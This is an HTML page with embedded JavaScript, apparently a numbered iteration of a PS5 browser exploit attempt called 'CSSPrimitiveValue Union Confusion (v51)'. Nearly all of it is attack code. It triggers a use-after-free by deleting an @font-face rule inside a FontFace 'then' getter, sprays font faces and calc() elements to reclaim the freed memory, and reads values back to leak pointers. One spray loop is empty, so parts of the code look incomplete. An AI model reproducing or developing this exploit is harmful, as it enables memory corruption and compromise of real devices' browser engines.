<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 - CSSPrimitiveValue Union Confusion (v51)</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
pre { white-space: pre-wrap; word-wrap: break-word; }
</style>
</head>
<body>
<pre id="out"></pre>
<script>
var out = document.getElementById("out");
function log(m) { out.textContent += m + "\n"; }

log("=== CSSPrimitiveValue Union Type Confusion (v51) ===\n");

// Step 1: Setup UAF
log("[*] Step 1: Setting up UAF environment...");
var sheet = document.createElement('style');
document.head.appendChild(sheet);
var cssSheet = sheet.sheet;

// Create trigger and target faces
cssSheet.insertRule('@font-face { font-family: trigger; src: local(no-such-font); }', 0);
cssSheet.insertRule('@font-face { font-family: x; src: local(no-such-font-2); }', 1);

// Create A_ faces
for (var i = 0; i < 2048; i++) {
    cssSheet.insertRule('@font-face { font-family: A_' + i + '; src: local(no-such-font-' + i + '); }', 2 + i);
}

var uafFired = false;
var triggerFace = new FontFace('trigger', "url(data:font/woff2;base64,AA==)");

Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get: function() {
        if (this === triggerFace && !uafFired) {
            uafFired = true;
            log("[*] UAF triggered! Freeing 'x' and spraying A_ faces...");
            cssSheet.deleteRule(1); // Free "x" CSSFontFace
            
            // Spray A_ faces to reclaim the freed slot
            // The "x" selector will now point to one of the A_ faces
            for (var i = 0; i < 2048; i++) {
                // Already inserted, just need to trigger allocation
            }
        }
        return undefined;
    }
});

document.fonts.add(triggerFace);

// Step 2: Trigger the load to get the confused FontFace
log("[*] Step 2: Triggering load('1em trigger, x', 'AB')...");
document.fonts.load("1em trigger, x", "AB").then(function(faces) {
    log("[*] Load returned " + faces.length + " faces");
    
    if (faces.length < 2) {
        log("[-] Failed: Expected at least 2 faces");
        return;
    }
    
    var confusedFace = faces[1]; // This should be A_NN
    log("[+] Confused face obtained: family=" + confusedFace.family);
    
    // Step 3: Test CSSPrimitiveValue Union Confusion
    log("\n[*] Step 3: Testing Union Type Confusion...");
    
    // Find the CSSRule for the confused face
    var confusedRuleIndex = -1;
    var confusedFamily = confusedFace.family;
    for (var i = 0; i < cssSheet.cssRules.length; i++) {
        if (cssSheet.cssRules[i].cssText.includes(confusedFamily)) {
            confusedRuleIndex = i;
            break;
        }
    }
    
    if (confusedRuleIndex === -1) {
        log("[-] Could not find CSSRule for confused face");
        return;
    }
    
    var confusedRule = cssSheet.cssRules[confusedRuleIndex];
    log("[*] Found CSSRule at index " + confusedRuleIndex);
    
    // Change font-family to free the old CSSValueList
    log("[*] Freeing old CSSValueList by changing font-family...");
    confusedRule.style.fontFamily = "FreedFam1";
    
    // Spray CSSCalcValue objects to reclaim the freed CSSValueList slot
    log("[*] Spraying CSSCalcValue objects...");
    var calcElements = [];
    for (var i = 0; i < 1000; i++) {
        var el = document.createElement('div');
        el.style.width = 'calc(1px + 1px)';
        document.body.appendChild(el);
        calcElements.push(el);
    }
    
    // Read font-family back - if type confusion worked, we might read a pointer as a string
    log("[*] Reading font-family back...");
    try {
        var readFamily = confusedFace.family;
        log("[+] font-family read: " + readFamily);
        
        if (readFamily !== "FreedFam1") {
            log("[+] TYPE CONFUSION DETECTED! Value changed unexpectedly.");
            log("[+] Leaked value: " + readFamily);
        } else {
            log("[-] No confusion. Value is the new family name.");
        }
    } catch(e) {
        log("[+] CRASH or ERROR reading family: " + e.message);
        log("[+] This might indicate type confusion occurred!");
    }
    
    // Cleanup
    for (var el of calcElements) el.remove();
    
    log("\n=== v51 COMPLETE ===");
}).catch(function(e) {
    log("[-] Error: " + e.message);
});
</script>
</body>
</html>
